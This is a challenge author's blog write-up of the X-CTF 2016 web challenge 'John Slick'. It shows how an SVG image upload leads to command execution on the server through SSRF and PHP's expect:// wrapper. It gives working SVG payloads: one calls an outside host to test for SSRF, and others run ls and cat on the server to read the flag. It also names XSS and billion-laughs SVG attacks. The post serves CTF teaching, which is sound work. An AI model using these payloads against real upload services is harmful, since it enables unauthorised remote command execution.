---
layout: post
title: X-CTF Finals 2016 - John Slick (Web 25)
modified:
categories: blog
excerpt: ""
tags: []
image:
  feature:
share: true
comments: true
date: 2016-06-22T22:32:53+02:00
---

X-CTF is a capture the flag competition in Singapore organized by NUS Greyhats. The on-site finals took place on Saturday, 18 June 2016. This is another one of the web challenge I wrote for the finals. All of the web challenges I wrote are done with the same front-end UI to make things simpler.

# JohnSlick
>**Points:** 25  
**Category:** Web  
**Description:**  Flag is on the server. Get a reverse shell :). Be nice, don't break the server. [http://bg3.spro.ink:8081](http://bg3.spro.ink:8081)

---

After registration and logging in, there's an upload feature that allows you to upload files to the server. However, there seems to be a check to ensure that only certain file types are allowed, namely, GIF, PNG, JPG and SVG.

![](/resources/images/x-ctf/johnslick_upload.png)

If you tried uploading a GIF, PNG or JPG file, you'll find that the image would be successfully uploaded and displayed.

![](/resources/images/x-ctf/johnslick_img.png){: width="400px"}

However, if you tried some random SVG file like the following, you'll get a different response instead. This is meant to be a hint to the participants.

If you upload an SVG file with the following contents:
{% highlight html linenos %}
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <rect x="0" y="150" height="10" width="300" style="fill: #000000"/>
</svg>
{% endhighlight %}

You should get a feedback saying: `Secret mode activated:`.

We can now be positively certain that the challenge has to do with a SVG file, the next step should then be pretty obvious. 
There are only a few common attacks that could be done with the use of a SVG file:

1. XSS due to the browser rendering the SVG file (`<script>alert(1)</script>` in an SVG element).
2. DOS attack due to a resource exhaustion similar to a billion laughs attack.
3. XXE attack due to the server parsing the SVG.

**Attack #1** would be possible if the SVG file was reflected to the user or some sort of back-end which would be viewed by an admin. However, we did not mention anything about an admin viewing anything, so this attack could have been ruled out easily.

**Attack #2** could be possible but would not allow for a reverse shell, which is our end goal.

**Attack #3** seems the most probable in this case, maybe an XXE + SSRF exploit that could allow us to run arbitrary code on the server's backend.

Looking up `SVG XXE SSRF` on Google shows a few attacks that have been done previously. In fact recently on hackerone.com there is a [publicly disclosed bug](https://hackerone.com/reports/142709) that is similar.

Following this lead, we can try an SVG payload like the following:
{% highlight html linenos %}
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="http://nusgreyhats.org:800/"></image>
</svg>
{% endhighlight %}

We then open a netcat instance on the remote server to watch for any attempts to connect to it. Upon uploading the SVG file, we see that no connections were made to our netcat instance. However, if you solved the web20 challenge, similar to [it](http://quanyang.github.io/x-ctf-finals-2016-john-sick-web-20/), certain URI scheme has been disabled.

We could however, try out all the URI schemes to see if any of them are enabled. 

The [expect](http://php.net/manual/en/wrappers.expect.php) wrapper though not enabled by default, would allow us to easily obtain a reverse shell. Trying out a simple exploit like the following could easily verify that the expect scheme is enabled:
{% highlight html linenos %}
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="expect://ls"></image>
</svg>
{% endhighlight %}

![](/resources/images/x-ctf/johnslick_svg.png)

We see that our `ls` payload has successfully executed. We can now easily obtain a reverse shell, or to simply read the flag directly.

{% highlight html linenos %}
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="expect://ls /"></image>
</svg>
{% endhighlight %}

![](/resources/images/x-ctf/johnslick_cat.png)

And finally,
{% highlight html linenos %}
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="expect://cat /flag_is_really_here.xxe"></image>
</svg>
{% endhighlight %}

![](/resources/images/x-ctf/johnslick_flag.png)

And we have our flag: `XCTF{XXE_IS_PR0BABLY_NOT_XTRA_XTRA_E@SY}`!

This challenge might not be exactly realistic as it took me some hacking in order to get the SSRF vulnerability to work correctly. However, this challenge is meant to introduce the idea of XXE attacks to participants and that XXE + SSRF attack could possibly lead to RCE as seen in the recent imagemagick vulnerability.